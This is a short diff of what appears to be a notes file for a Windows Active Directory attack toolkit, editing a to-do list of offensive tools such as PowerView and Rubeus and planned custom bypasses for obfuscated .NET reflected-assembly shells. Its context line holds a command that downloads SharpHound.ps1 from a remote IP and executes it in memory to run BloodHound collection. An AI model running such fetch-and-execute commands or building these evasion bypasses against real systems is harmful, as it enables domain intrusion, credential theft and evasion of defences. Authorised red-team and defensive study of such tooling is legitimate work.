@@ -74,7 +74,7 @@ iex (iwr http://172.16.99.77/SharpHound.ps1); Invoke-BloodHound -CollectionMetho
 
 ## to-be-added
 
-- `SessionHunter`
+- `Invoke-SessionHunter`
 - `PowerView`
-- `Rubeus`
-- obfuscated shell for .net reflected assemblies
+- `Invoke-Rubeus`
+- obfuscated shell for .net reflected assemblies (empire already has a folder for this but I will make some custom bypasses)
